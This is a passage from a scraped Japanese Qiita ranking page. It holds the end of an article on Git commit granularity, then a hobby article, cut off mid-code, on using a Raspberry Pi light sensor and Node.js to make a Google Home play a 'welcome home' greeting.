<span id="意見1チケット単位または戻したい単位でコミット" class="fragment"></span><a href="#%E6%84%8F%E8%A6%8B1%E3%83%81%E3%82%B1%E3%83%83%E3%83%88%E5%8D%98%E4%BD%8D%E3%81%BE%E3%81%9F%E3%81%AF%E6%88%BB%E3%81%97%E3%81%9F%E3%81%84%E5%8D%98%E4%BD%8D%E3%81%A7%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a>意見1：チケット単位、または戻したい単位でコミット</h3>

<ul>
<li>機能単位（1タスク、1チケット）で1コミットする</li>
<li>大きなチケットはブランチを分けて、squashを使って1コミットにまとめる</li>
</ul>

<h3>
<span id="意見2コミットはドラクエのセーブと同じ" class="fragment"></span><a href="#%E6%84%8F%E8%A6%8B2%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%AF%E3%83%89%E3%83%A9%E3%82%AF%E3%82%A8%E3%81%AE%E3%82%BB%E3%83%BC%E3%83%96%E3%81%A8%E5%90%8C%E3%81%98"><i class="fa fa-link"></i></a>意見2：コミットはドラクエのセーブと同じ</h3>

<ul>
<li>ドラクエ＝ためた経験値を失いたくないと思ったらセーブ</li>
<li>開発＝ここまで書いたコード、ここまで作った機能を失いたくない、と思ったらコミット</li>
</ul>

<h3>
<span id="意見3正常に動く単位にする" class="fragment"></span><a href="#%E6%84%8F%E8%A6%8B3%E6%AD%A3%E5%B8%B8%E3%81%AB%E5%8B%95%E3%81%8F%E5%8D%98%E4%BD%8D%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>意見3：正常に動く単位にする</h3>

<ul>
<li>コミットした時点ではプログラムがちゃんと動く、テストコードが全部パスする状態に保つ</li>
<li>ロールバックするケースもあるので、ロールバックしたときにプログラムが壊れている、というのは運用しづらい</li>
</ul>

<h3>
<span id="意見4todoリスト単位でコミットする" class="fragment"></span><a href="#%E6%84%8F%E8%A6%8B4todo%E3%83%AA%E3%82%B9%E3%83%88%E5%8D%98%E4%BD%8D%E3%81%A7%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>意見4：TODOリスト単位でコミットする</h3>

<ul>
<li>大きな機能を実装する前はTODOリスト（例：カラムを追加する、計算ロジックを実装する、画面を作成する、etc）を作成する</li>
<li>TODOリストのTODOを1つ終わらせるたびに1コミットする</li>
</ul>

<h3>
<span id="意見5コミットの前に機能ブランチを作る" class="fragment"></span><a href="#%E6%84%8F%E8%A6%8B5%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%AE%E5%89%8D%E3%81%AB%E6%A9%9F%E8%83%BD%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>意見5：コミットの前に機能ブランチを作る</h3>

<ul>
<li>コードの変更管理の単位はコミットだけではない</li>
<li>コミットよりも一段大きな単位として、ブランチとマージ（pull request）という単位もある</li>
<li>大きな機能を実装する場合は、ブランチを切って「機能実装に着手する前にロールバック」できるようにしておくことも大事</li>
</ul>

<h2>
<span id="極端なもしもを考えてみる1050" class="fragment"></span><a href="#%E6%A5%B5%E7%AB%AF%E3%81%AA%E3%82%82%E3%81%97%E3%82%82%E3%82%92%E8%80%83%E3%81%88%E3%81%A6%E3%81%BF%E3%82%8B1050"><i class="fa fa-link"></i></a>極端な「もしも」を考えてみる（10:50～）</h2>

<p>「粒度」というのは簡単にいうと「大きさ」のことです。<br>
適切な大きさを考えるのであれば、「極端に大きい粒度」と「極端に小さい粒度」を想像してみると、両者のデメリットから「適切な粒度」が見えてきます。</p>

<h3>
<span id="極端に大きかったら" class="fragment"></span><a href="#%E6%A5%B5%E7%AB%AF%E3%81%AB%E5%A4%A7%E3%81%8D%E3%81%8B%E3%81%A3%E3%81%9F%E3%82%89"><i class="fa fa-link"></i></a>極端に大きかったら？</h3>

<p>まったくコミットしなかったら？もしくは、リリース直前に1回だけコミットするとしたら？</p>

<ul>
<li>コミットしない＝元に戻れない</li>
<li>「何かあったらここまで戻りたい」「この変更を加えたらプログラムが壊れるかもしれない」と思ったときにコミット</li>
<li>最悪、プログラムが壊れたときにはロールバックできるようにする</li>
</ul>

<h3>
<span id="極端に小さかったら" class="fragment"></span><a href="#%E6%A5%B5%E7%AB%AF%E3%81%AB%E5%B0%8F%E3%81%95%E3%81%8B%E3%81%A3%E3%81%9F%E3%82%89"><i class="fa fa-link"></i></a>極端に小さかったら？</h3>

<p>もし1行毎にコミットしたら？</p>

<ul>
<li>コミットログが大量に増える</li>
<li>コミットメッセージの付け方にも困りそう</li>
<li>コミットのdiffを見たときに、他の行や他のファイルの変更点もある程度見えないと、どういう目的でどういう変更がなされたのか把握しづらい</li>
</ul>

<h3>
<span id="粒度を考えてみるとわかるコミットの役割" class="fragment"></span><a href="#%E7%B2%92%E5%BA%A6%E3%82%92%E8%80%83%E3%81%88%E3%81%A6%E3%81%BF%E3%82%8B%E3%81%A8%E3%82%8F%E3%81%8B%E3%82%8B%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%AE%E5%BD%B9%E5%89%B2"><i class="fa fa-link"></i></a>粒度を考えてみるとわかる、コミットの役割</h3>

<ul>
<li>何か問題が起きたときに「ここへ戻りたい！」というポイントを保存する</li>
<li>コミットはあとから変更内容を振り返るときにも使われる</li>
<li>blameして「この行はどういう目的で書かれたんだろう？」と振り返るときにも使われる</li>
</ul>

<h2>
<span id="その他の流儀1640" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E6%B5%81%E5%84%801640"><i class="fa fa-link"></i></a>その他の流儀（16:40～）</h2>

<p>僕は必ずしも適用しているわけではありませんが、こういう考え方もあります。</p>

<h3>
<span id="generatorで自動生成したら即コミットする" class="fragment"></span><a href="#generator%E3%81%A7%E8%87%AA%E5%8B%95%E7%94%9F%E6%88%90%E3%81%97%E3%81%9F%E3%82%89%E5%8D%B3%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>generatorで自動生成したら即コミットする</h3>

<ul>
<li>generatorで自動生成したら即コミット、そのあと、手で書き換えたら再度コミット</li>
<li>どれが自動生成されたコードで、どれが人間の手で書いたコードなのかがあとから分かる</li>
<li>ただし、すでに途中まで手で変更を加えている状態で、generatorを使うと結局手で変更したコードが混じってしまう（し、それだとプログラムが壊れた状態でコミットすることにもなりかねない）</li>
</ul>

<h2>
<span id="実際のコミットログを見てみる1920" class="fragment"></span><a href="#%E5%AE%9F%E9%9A%9B%E3%81%AE%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%83%AD%E3%82%B0%E3%82%92%E8%A6%8B%E3%81%A6%E3%81%BF%E3%82%8B1920"><i class="fa fa-link"></i></a>実際のコミットログを見てみる（19:20～）</h2>

<p>最後に、実際のコミットログを見ながら、僕がどんな粒度で、どんな考え方でコミットしているのかを自分で考察してみました。</p>

<p>ここで使ったのは以下のコミットログです。</p>

<p><a href="https://github.com/JunichiIto/train-ticket-rails/commits/master" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/JunichiIto/train-ticket-rails/commits/master</a></p>

<ul>
<li>rails newしたあとの初回コミット

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/a5e94d1c9fc9a6bda63558651470e36372ca5f92" rel="nofollow noopener" target="_blank">Initial commit</a></li>
</ul>
</li>
<li>モデルを追加

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/3e172dbd929d9979e9079ac177ded70032a2fd75" rel="nofollow noopener" target="_blank">Add gate model</a></li>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/f8518ead6b906e1691f0d1ad1d580f963539d3bc" rel="nofollow noopener" target="_blank">Add ticket model</a></li>
</ul>
</li>
<li>改札口モデルに降車メソッド（<code>exit?</code>メソッド）の正常系を実装

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/a9df86e3e19d7a57c19350654230f601b302d8b9" rel="nofollow noopener" target="_blank">Implementing exit method</a></li>
</ul>
</li>
<li>降車メソッドの異常系（運賃不足の場合）を実装

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/98ab79dceeb7f1d31a23bddb737ed61000313330" rel="nofollow noopener" target="_blank">Calc fare</a></li>
</ul>
</li>
<li>切符モデルに降車駅を記録するロジックを実装

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/3e12fff283d2215bbe90dccc69ed841a2ff90895" rel="nofollow noopener" target="_blank">Mark exited gate</a></li>
</ul>
</li>
<li>画面（ControllerとView）の作成

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/eee80a375d869271b8bd4f1ccbe7ffcdda121a40" rel="nofollow noopener" target="_blank">Create views</a></li>
</ul>
</li>
<li>画面周り（見た目）の手直し

<ul>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/60513de10916315b99a226f8a60ae06f2b63476f" rel="nofollow noopener" target="_blank">Use bootstrap-sass</a></li>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/79d1c6b0d8904efdf28b7226a537dcccf235bc6a" rel="nofollow noopener" target="_blank">Tweak style</a></li>
<li><a href="https://github.com/JunichiIto/train-ticket-rails/commit/cf721264f93e3e6e7c5de22da96d82ba35f7fd74" rel="nofollow noopener" target="_blank">Tweak UI</a></li>
</ul>
</li>
</ul>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>というわけで、いろいろ考えてみた結果、以下のようなタイミングでコミットするようにすると、そこそこ「適切な粒度」でコミットできるようになるんじゃないでしょうか？</p>

<ul>
<li>何かあったらここまで戻りたい！という単位でコミット</li>
<li>あとから振り返ったときに「変更の意図や目的」がわかる単位でコミット</li>
<li>正常に動く単位でコミット

<ul>
<li>ロールバックしたらプログラムが壊れた！とならないように</li>
</ul>
</li>
<li>TODOリストのTODOが1つ片付いたらコミット</li>
<li>大きな機能を実装する場合はまず機能ブランチを切って、最後にマージ（pull request）する</li>
<li>場合によっては複数のコミットを1コミットにsquashする

<ul>
<li>Rails本体の開発など</li>
</ul>
</li>
</ul>

<p>こうした内容を参考にしつつ、みなさんの開発の現場でも「適切なコミット粒度」について議論してみてください！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">55位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>184</kbd>
		<a target="_blank" href="https://qiita.com/taaaaaaak22/items/abfb9f2a672689c20505">帰宅したらGoogleHomeから好きな音声で「おかえり」って言ってもらいます</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-23<br />00:12:46</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/161726.html">taaaaaaak22</a>(1件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/161726/profile-images/1508519800">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Node.js]</b> <b>[RaspberryPi]</b> <b>[IoT]</b> <b>[GoogleHome]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><a href="https://qiita.com/azipinsyan/items/db4606aaa51426ac8dac" id="reference-30d7471c4fadce9bd42f">GoogleHomeスピーカーに外部からプッシュして自発的に話してもらいます</a>の記事を読んだときにこう思った。<br>
帰宅したらGoogleHomeに自発的に「おかえり」や「お疲れ様」って言ってもらいたい。<br>
しかも自分の好きな音声で。<br>
今回は、RaspberryPiを利用して作ってみました。</p>

<h1>
<span id="必要なもの" class="fragment"></span><a href="#%E5%BF%85%E8%A6%81%E3%81%AA%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>必要なもの</h1>

<ul>
<li>RaspberryPi(照度センサーを使います)</li>
<li>GoogleHome</li>
</ul>

<h1>
<span id="流れ" class="fragment"></span><a href="#%E6%B5%81%E3%82%8C"><i class="fa fa-link"></i></a>流れ</h1>

<ol>
<li>RaspberryPiで帰宅を検知</li>
<li>google-home-notifier.jsを使ってGoogleHomeに音声ファイルを再生させる</li>
</ol>

<h2>
<span id="raspberrypiで帰宅を検知" class="fragment"></span><a href="#raspberrypi%E3%81%A7%E5%B8%B0%E5%AE%85%E3%82%92%E6%A4%9C%E7%9F%A5"><i class="fa fa-link"></i></a>RaspberryPiで帰宅を検知</h2>

<p>ワンルームに住んでいるので、RaspberryPiで部屋の照明の状態を監視することで帰宅を検知できないか考えました。<br>
以下の条件にすべて当てはまれば、帰宅したとみなします。<br>
1. 照明がONになった<br>
2. 照明がONになった時間帯が18:00 ~ 24:00の間<br>
3. 照明がOFFからONに変わるまで6時間以上たっている</p>

<h3>
<span id="回路を組む" class="fragment"></span><a href="#%E5%9B%9E%E8%B7%AF%E3%82%92%E7%B5%84%E3%82%80"><i class="fa fa-link"></i></a>回路を組む</h3>

<p>RaspberryPiで照明の状態を監視するために、照度センサーを組み込みます。<br>
当方、電子工作初心者ですが、下記のサイトを参考に回路を組んでみました。<br>
<a href="https://qiita.com/Ichiro_Tsuji/items/e77d7d3ec4469ef006ce" id="reference-b1651bad9dc89a564476">RaspberryPiで照度計をつくろう</a></p>

<p>照度を取得する処理はnode.jsで実装します。</p>

<h3>
<span id="照度の値を取得する" class="fragment"></span><a href="#%E7%85%A7%E5%BA%A6%E3%81%AE%E5%80%A4%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>照度の値を取得する</h3>

<p>下記のサイトを参考にnode.jsで照度を取得しました。<br>
<a href="http://blog.mlkcca.com/iot/realtime-data-visualization-with-raspberry-pi-2/" rel="nofollow noopener" target="_blank">Raspberry Piで取得したセンサーデータをリアルタイムに可視化する（センサー編）</a></p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">app.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">SPI</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'pi-spi'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">spi</span> <span class="o">=</span> <span class="nx">SPI</span><span class="p">.</span><span class="nx">initialize</span><span class="p">(</span><span class="s2">"/dev/spidev0.0"</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">MCP3002</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">([</span><span class="mh">0x78</span><span class="p">,</span> <span class="mi">0</span><span class="p">]);</span> <span class="c1">// チャンネルは1にセット</span>

<span class="c1">// 毎秒照明の値を監視</span>
<span class="nx">setInterval</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">spi</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">MCP3002</span><span class="p">,</span> <span class="nx">MCP3002</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="p">((</span><span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">data</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x03FF</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">});</span>
<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</pre></div>
</div>

<p>照度を取得できているか確認するため実行してみます。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span><span class="nx">$</span> <span class="nx">node</span> <span class="nx">app</span><span class="p">.</span><span class="nx">js</span>

<span class="mi">521</span> <span class="c1">// 照明がONの状態</span>
<span class="mi">508</span>
<span class="mi">512</span>
<span class="mi">505</span>
<span class="mi">510</span>
<span class="mi">499</span> <span class="c1">// 照明をOFFにした</span>
<span class="mi">473</span>
<span class="mi">475</span>
<span class="mi">132</span>
<span class="mi">45</span>
<span class="mi">22</span>
<span class="mi">0</span>
<span class="mi">501</span> <span class="c1">// 照明をONにした</span>
<span class="mi">509</span>
</pre></div></div>

<p>今回は、照度が500を超えていれば、照明がONになっているとします。</p>

<h3>
<span id="帰宅検知" class="fragment"></span><a href="#%E5%B8%B0%E5%AE%85%E6%A4%9C%E7%9F%A5"><i class="fa fa-link"></i></a>帰宅検知</h3>

<p>以下の条件にすべて当てはまれば、帰宅したとみなします。<br>
1. 照明がONになった<br>
2. 照明がONになった時間帯が18:00 ~ 24:00の間<br>
3. 照明がOFFからONに変わるまで6時間以上たっている</p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">app.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">moment</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'moment'</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">previousStatus</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span> <span class="c1">// 照明の状態</span>
<span class="kd">let</span> <span class="nx">previousTime</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>   <span class="c1">// 照明の状態が変わった時間</span>

<span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="p">((</span><span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">data</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x03FF</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="mi">500</span> <span class="o">&amp;&amp;</span> <span class="nx">previousStatus</span> <span class="o">===</span> <span class="s1">'off'</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 照明がon</span>
    <span class="nx">previousStatus</span> <span class="o">=</span> <span class="s1">'on'</span><span class="p">;</span>
    <span class="kr">const</span> <span class="nx">changeTime</span> <span class="o">=</span> <span class="nx">moment</span><span class="p">();</span>
    <span class="kr">const</span> <span class="nx">durationMinutes</span> <span class="o">=</span> <span class="nx">changeTime</span><span class="p">.</span><span class="nx">diff</span><span class="p">(</span><span class="nx">previousTime</span><span class="p">,</span> <span class="s1">'minutes'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">changeTime</span> <span class="o">&gt;=</span> <span class="nx">moment</span><span class="p">({</span><span class="nx">H</span><span class="o">:</span><span class="mi">18</span><span class="p">,</span> <span class="nx">m</span><span class="o">:</span><span class="mi">0</span><span class="p">,</span> <span class="nx">s</span><span class="o">:</span><span class="mi">0</span><span class="p">})</span> <span class="o">&amp;&amp;</span> <span class="nx">changeTime</span> <span class="o">&lt;=</span> <span class="nx">moment</span><span class="p">({</span><span class="nx">H</span><span class="o">:</span><span class="mi">23</span><span class="p">,</span> <span class="nx">m</span><span class="o">:</span><span class="mi">59</span><span class="p">,</span> <span class="nx">s</span><span class="o">:</span><span class="mi">59</span><span class="p">})</span> <span class="o">&amp;&amp;</span> <span class="nx">durationMinutes</span> <span class="o">&gt;=</span> <span class="mi">300</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'帰宅！'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">previousTime</span> <span class="o">=</span> <span class="nx">changeTime</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">value</span> <span class="o">&lt;</span> <span class="mi">500</span> <span class="o">&amp;&amp;</span> <span class="nx">previousStatus</span> <span class="o">===</span> <span class="s1">'on'</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 照明がoff</span>
    <span class="nx">previousStatus</span> <span class="o">=</span> <span class="s1">'off'</span><span class="p">;</span>
    <span class="nx">previousTime</span> <span class="o">=</span> <span class="nx">changeTime</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="google-home-notifierjsを使ってgooglehomeに音声ファイルを再生させる" class="fragment"></span><a href="#google-home-notifierjs%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6googlehome%E3%81%AB%E9%9F%B3%E5%A3%B0%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E5%86%8D%E7%94%9F%E3%81%95%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a>google-home-notifier.jsを使ってGoogleHomeに音声ファイルを再生させる</h2>

<h3>
<span id="google-home-notifierjs" class="fragment"></span><a href="#google-home-notifierjs"><i class="fa fa-link"></i></a><a href="https://github.com/noelportugal/google-home-notifier" rel="nofollow noopener" target="_blank">google-home-notifier.js</a>
</h3>

<p>Chromecast Client向けのプロトコルを利用して、GoogleHomeにしゃべらせることができるとのこと。<br>
好きなテキストをGoogleHomeに喋らせることができるようですが、音声ファイルを喋らせるメソッドもあることを発見。</p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">google-home-notifier.js</span></div>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">play</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">mp3_url</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">deviceAddress</span><span class="p">){</span>
    <span class="nx">browser</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
    <span class="nx">browser</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'serviceUp'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">service</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Device "%s" at %s:%d'</span><span class="p">,</span> <span class="nx">service</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">service</span><span class="p">.</span><span class="nx">addresses</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">service</span><span class="p">.</span><span class="nx">port</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">service</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">device</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">))){</span>
        <span class="nx">deviceAddress</span> <span class="o">=</span> <span class="nx">service</span><span class="p">.</span><span class="nx">addresses</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nx">getPlayUrl</span><span class="p">(</span><span class="nx">mp3_url</span><span class="p">,</span> <span class="nx">deviceAddress</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">callback</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
        <span class="p">});</span>
      <span class="p">}</span>
      <span class="nx">browser</span><span class="p">.</span><span class="nx">stop</span><span class="p">();</span>
    <span class="p">});</span>
  <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
    <span class="nx">getPlayUrl</span><span class="p">(</span><span class="nx">mp3_url</span><span class="p">,</span> <span class="nx">deviceAddress</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">callback</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
    <span class="p">});</span>
  <span class="p">}</span>
<span class="p">};</span>
</pre></div>
</div>

<p>GoogleHomeに接続するための設定をするにあたり、<code>gooogle-home-notifier.js</code>に手を加えます。</p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">gooogle-home-notifier.js</span></div>
<div class="highlight"><pre><span></span><span class="c1">// 第２引数からGoogleHomeのIPアドレスを指定できるようにします。</span>
<span class="kd">var</span> <span class="nx">device</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">address</span><span class="p">,</span> <span class="nx">lang</span> <span class="o">=</span> <span class="s1">'en'</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 第2引数にaddressを追加</span>
    <span class="nx">device</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
    <span class="nx">deviceAddress</span> <span class="o">=</span> <span class="nx">address</span><span class="p">;</span> <span class="c1">// ここを追加</span>
    <span class="nx">language</span> <span class="o">=</span> <span class="nx">lang</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">this</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
</div>

<p>帰宅を検知すると、<code>play</code>メソッドを呼び出します。</p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">app.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">googleHomeNotifier</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'google-home-notifier'</span><span class="p">);</span>
<span class="nx">googleHomeNotifier</span><span class="p">.</span><span class="nx">device</span><span class="p">(</span><span class="s1">'GoogleHome'</span><span class="p">,</span><span class="s1">'192.168.x.x'</span><span class="p">,</span> <span class="s1">'ja'</span><span class="p">);</span>
<span class="nx">googleHomeNotifier</span><span class="p">.</span><span class="nx">accent</span><span class="p">(</span><span class="s1">'ja'</span><span class="p">);</span>

<span class="c1">// 帰宅を検知したらGoogleHomeから音声を再生する</span>
<span class="nx">googleHome</span><span class="p">.</span><span class="nx">play</span><span class="p">(</span><span class="s1">'http://192.168.x.x:8080/audio/test.mp3'</span><span class="p">,</span> <span class="p">(</span><span class="nx">notifyRes</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">notifyRes</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<p>今回はラズパイ上にmp3ファイルを保持するため、音声ファイルを返すAPIをexpressでサクッと実装します。</p>

<h3>
<span id="音声ファイルを返すapi" class="fragment"></span><a href="#%E9%9F%B3%E5%A3%B0%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E8%BF%94%E3%81%99api"><i class="fa fa-link"></i></a>音声ファイルを返すAPI</h3>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">api.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">);</span>

<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kr">const</span> <span class="nx">serverPort</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">urlencodedParser</span> <span class="o">=</span> <span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">false</span> <span class="p">});</span>

<span class="c1">// CORSを許可</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="s2">"Access-Control-Allow-Origin"</span><span class="p">,</span> <span class="s2">"*"</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="s2">"Access-Control-Allow-Headers"</span><span class="p">,</span> <span class="s2">"Origin, X-Requested-With, Content-Type, Accept"</span><span class="p">);</span>
  <span class="nx">next</span><span class="p">();</span>
<span class="p">});</span>

<span class="cm">/**</span>
<span class="cm"> * 音声ファイルを取得</span>
<span class="cm"> */</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/googlehome/:audioName'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">audioName</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">audioName</span><span class="p">;</span>
